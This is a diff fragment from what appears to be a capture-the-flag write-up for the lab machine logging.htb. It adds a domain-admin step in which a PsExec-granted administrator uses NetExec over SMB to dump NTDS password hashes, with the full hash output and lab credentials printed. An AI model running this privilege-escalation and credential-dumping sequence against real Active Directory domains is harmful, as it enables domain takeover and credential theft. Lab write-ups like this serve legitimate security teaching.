@@ -876,7 +876,39 @@ PsExec64.exe /accepteula /s powershell.exe "net localgroup Administrators wallac
 
 Ill run the command, then the service will run and make a connection back
 
-```python
+# Domain Admin
 
+```python
+nxc smb dc01.logging.htb -u 'wallace.everette' -p 'Welcome2026@'             
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
 ```
+
+This user is now an Administrator
+
+```python
+❯❯❯ nxc smb dc01.logging.htb -u 'wallace.everette' -p 'Welcome2026@' --ntds    
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
+SMB         10.129.245.130  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.245.130  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
+SMB         10.129.245.130  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.245.130  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66ff41c8e28783a47fd7617f1f0125f0:::
+SMB         10.129.245.130  445    DC01             logging.htb\svc_recovery:2104:aad3b435b51404eeaad3b435b51404ee:fbeb47c9c100020d3b9ebaf1ce839fb3:::
+SMB         10.129.245.130  445    DC01             logging.htb\jaylee.clifton:2105:aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0:::
+SMB         10.129.245.130  445    DC01             logging.htb\monique.chip:2106:aad3b435b51404eeaad3b435b51404ee:5595521651b7510b86438f7452606abf:::
+SMB         10.129.245.130  445    DC01             logging.htb\kyson.abel:2107:aad3b435b51404eeaad3b435b51404ee:a50981f25606aeaa0d442f0fcbbce699:::
+SMB         10.129.245.130  445    DC01             logging.htb\fable.milford:2108:aad3b435b51404eeaad3b435b51404ee:26a4b1da75600cdd7a3d77789d40a889:::
+SMB         10.129.245.130  445    DC01             logging.htb\wellington.kylan:2109:aad3b435b51404eeaad3b435b51404ee:20a6efc7a20a14021a717fa06cd250f8:::
+SMB         10.129.245.130  445    DC01             logging.htb\serina.philander:2110:aad3b435b51404eeaad3b435b51404ee:42961be97eb21e2fa7664b115e2ac3af:::
+SMB         10.129.245.130  445    DC01             logging.htb\wallace.everette:2111:aad3b435b51404eeaad3b435b51404ee:40e28a964e1a6a6512d0ebc70f1ca811:::
+SMB         10.129.245.130  445    DC01             logging.htb\toby.brynleigh:2112:aad3b435b51404eeaad3b435b51404ee:ac384497550a56937cd6edd784fb221c:::
+SMB         10.129.245.130  445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b4d05e08453f856b0ff4af1125157a84:::
+SMB         10.129.245.130  445    DC01             msa_health$:2113:aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
+SMB         10.129.245.130  445    DC01             [+] Dumped 14 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.129.245.130_2026-10-07_211450.ntds of which 12 were added to the database
+SMB         10.129.245.130  445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.129.245.130  445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.129.245.130_2026-10-07_211450.ntds | cut -d ':' -f1
+```
+
+Then i can dump the NTDS
 
